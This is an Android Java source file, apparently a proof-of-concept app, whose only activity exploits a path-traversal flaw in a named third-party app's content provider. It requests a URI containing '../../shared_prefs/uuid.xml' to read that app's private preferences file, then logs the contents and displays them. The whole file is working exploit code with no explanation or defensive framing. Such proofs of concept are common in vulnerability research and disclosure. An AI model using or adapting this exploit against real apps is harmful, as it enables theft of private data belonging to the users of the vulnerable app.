package com.wnagzihxa1n.pocapk;

import android.app.Activity;
import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import java.io.FileInputStream;

public class MainActivity extends Activity {

    private TextView textView;
    static final String TAG = "toT0C";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        textView = (TextView) findViewById(R.id.text);
        ContentResolver contentResolver = getContentResolver();

        FileInputStream fileInputStream = null;
        Uri uri_openfile = Uri.parse("content://com.ganji.html5.localfile.1/webview/../../shared_prefs/uuid.xml");
//        Log.i(TAG, uri_openfile.getLastPathSegment());
//        Log.i(TAG, Uri.parse(uri_openfile.getLastPathSegment()).getLastPathSegment());
//        Log.i(TAG, Uri.decode(uri_openfile.toString()));
        Log.i(TAG, "uri_openfile.getPath()->" + uri_openfile.getPath());
        try {
            fileInputStream = (FileInputStream) contentResolver.openInputStream(uri_openfile);
            byte[] data = new byte[fileInputStream.available()];
            fileInputStream.read(data);
            textView.setText(new String(data));
            Log.i(TAG, new String(data));
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                fileInputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
